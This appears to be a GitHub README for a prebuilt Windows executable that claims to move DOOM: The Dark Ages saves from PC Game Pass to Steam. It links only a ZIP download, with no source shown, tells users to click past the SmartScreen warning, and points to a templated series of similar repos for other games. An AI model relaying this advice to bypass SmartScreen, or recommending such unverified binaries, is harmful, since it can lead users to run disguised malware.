<p align="center">
  <img src="https://i.postimg.cc/pXgPMQf9/banner.png" alt="DOOM: The Dark Ages Game Pass to Steam Save Bridge — Convert WGS Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-doom--tda--wgs--v1.1-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# DOOM: The Dark Ages Game Pass to Steam Save Bridge — Convert WGS Saves to Steam

**Played DOOM: The Dark Ages on PC Game Pass and picked up the Steam edition? Xbox App locks idTech 8 campaign saves inside hashed WGS containers. Unpack and bridge your Slayer progression to Steam Saved Games cleanly.**

DOOM: The Dark Ages Game Pass to Steam Save Bridge automates transferring campaign checkpoints between Xbox App and Steam on Windows: **parsing `container.index` inside `%LOCALAPPDATA%\Packages\BethesdaSoftworks.DOOMTheDarkAges_*\SystemAppData\wgs\` and mapping extracted files to `%USERPROFILE%\Saved Games\id Software\DOOMTheDarkAges\base\savegame`**.

This project is aimed at **DOOM: The Dark Ages on Windows 10/11 PC** for migrating campaign saves and weapon mastery progress between PC Game Pass and Steam.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Steam DOOM: The Dark Ages starts with empty campaign slots | Xbox App stores idTech 8 saves inside hashed `SystemAppData\wgs` containers | Decode `container.index` and extract save files into Steam `Saved Games` |
| Raw hex blobs copied from `wgs` are not recognized by Steam | idTech 8 requires exact slot folder names (`GAME-AUTOSAVE0`, `PROFILE`) | Restore internal slot structure recorded inside `container.index` |
| Steam Cloud overwrites migrated saves on first boot | Steam Cloud syncs a fresh profile over manually placed folders | Run Steam DOOM once first, back up, then transfer converted saves |
| Keeping your Game Pass cloud save safe | Modifying `wgs` directly can corrupt Xbox cloud sync | Read `wgs` strictly in read-only mode and archive backups first |

## Download for Windows

[**Download DoomDarkAgesSave.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/DoomDarkAgesSave.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `DoomDarkAgesSave.exe`? (Key features)

- Scans `%LOCALAPPDATA%\Packages` to locate the DOOM: The Dark Ages `SystemAppData\wgs` folder automatically.
- Decodes `container.index` to rebuild idTech 8 `PROFILE` and `GAME-AUTOSAVE` save directories.
- Creates a dated backup of both your Xbox `wgs` and Steam `Saved Games\id Software\DOOMTheDarkAges` folders first.
- Preserves your original Xbox Game Pass save untouched.

### Sample Output

```text
[DoomDarkAgesSave] Scanning BethesdaSoftworks.DOOMTheDarkAges WGS & Steam Saved Games...
[OK]   Game Pass WGS    : C:\Users\Player\AppData\Local\Packages\BethesdaSoftworks.DOOMTheDarkAges\SystemAppData\wgs
[OK]   Decoded Profile  : PROFILE + GAME-AUTOSAVE0 (Chapter 14 | 4.8 MB)
[OK]   Backup Created   : Documents\DoomDarkAges-SaveBackup\2026-11-23\
[OK]   Steam Target     : C:\Users\Player\Saved Games\id Software\DOOMTheDarkAges\base\savegame
```

The release ZIP is named `DoomDarkAgesSave.zip`; the Windows executable inside is named `DoomDarkAgesSave.exe`.

1. Close DOOM Dark Ages Save Bridge before updating or replacing executable files.
2. Click **Download DoomDarkAgesSave.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `DoomDarkAgesSave.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of DOOM: The Dark Ages installed.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `DoomDarkAgesSave.exe` runs locally without uploading your personal files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### idTech 8 profile & autosave structure split inside Xbox `wgs`

Reconstructs the exact `PROFILE` and `GAME-AUTOSAVE` subdirectory hierarchy expected by the Steam build.

### Preventing Steam Cloud from wiping migrated slots

Initializing Steam's `Saved Games\id Software` directory before copying ensures Steam Cloud accepts your progress.

### Automatic dated backups of both platforms

Archives existing saves before writing any files.

### Read-only access to Xbox `wgs`

Leaves your Game Pass save safe to launch anytime.

## Default folders and configuration paths

DOOM: The Dark Ages stores PC Game Pass and Steam saves in two separate user locations:

```text
%LOCALAPPDATA%\Packages\BethesdaSoftworks.DOOMTheDarkAges_*\SystemAppData\wgs\
```

Typical directory layout:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\BethesdaSoftworks.DOOMTheDarkAges_*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlobs>

Steam Edition (Target):
%USERPROFILE%\Saved Games\id Software\DOOMTheDarkAges\base\savegame\<SteamID>\
```

Launch Steam DOOM: The Dark Ages once to the main menu so idTech 8 creates your `<SteamID>` save directory before running the bridge.

## Quick start guide

Follow these steps to get started:

1. **Close DOOM: The Dark Ages on both Xbox App and Steam.** Wait for cloud synchronization to finish.
2. **Launch Steam DOOM: The Dark Ages once to the main menu, then exit.** Creates `%USERPROFILE%\Saved Games\id Software\DOOMTheDarkAges`.
3. **Extract `DoomDarkAgesSave.zip` and run `DoomDarkAgesSave.exe`.** Backs up both folders and reconstructs your save slots in Steam.
4. **Launch Steam DOOM: The Dark Ages and load your campaign slot.** Complete a checkpoint so Steam Cloud syncs your progress.

### Data safety note

Never delete or rename files inside `SystemAppData\wgs\`; work strictly from extracted copies.

## What the status summary shows

DOOM Dark Ages Save Bridge displays **detected `wgs` package path, reconstructed `PROFILE`/`AUTOSAVE` slots, backup location, and target Steam folder**.

## FAQ

**Can I transfer my DOOM: The Dark Ages save from PC Game Pass to Steam?**

Yes—reconstructing the idTech 8 save slots from `SystemAppData\wgs` into `Saved Games\id Software\DOOMTheDarkAges` works cleanly.

**Does this delete my Xbox Game Pass save?**

No. Your `wgs` folder is read-only and remains untouched.

**Will my weapon upgrades and collectible toys carry over?**

Yes—all campaign and profile progression inside the save container transfers.

## Useful reading

- [DOOM: The Dark Ages on Steam](https://store.steampowered.com/app/3017860/DOOM_The_Dark_Ages/)

## More Windows Gaming Utilities

- [Expedition33-GamePassSaveBridge](../Expedition33-GamePassSaveBridge) — Clair Obscur: Expedition 33 Game Pass ↔ Steam save bridge
- [OblivionRemaster-WGSSaveConverter](../OblivionRemaster-WGSSaveConverter) — Oblivion Remastered Game Pass (`wgs`) ↔ Steam save converter
- [Avowed-WGSSaveMigrator](../Avowed-WGSSaveMigrator) — Avowed Game Pass (`wgs`) ↔ Steam save migrator
- [GearsEDay-WGSSaveConverter](../GearsEDay-WGSSaveConverter) — Gears of War: E-Day Game Pass ↔ Steam save converter

*Independent community project. Not affiliated with id Software, Bethesda Softworks, ZeniMax Media, Microsoft, Valve, or Steam.*
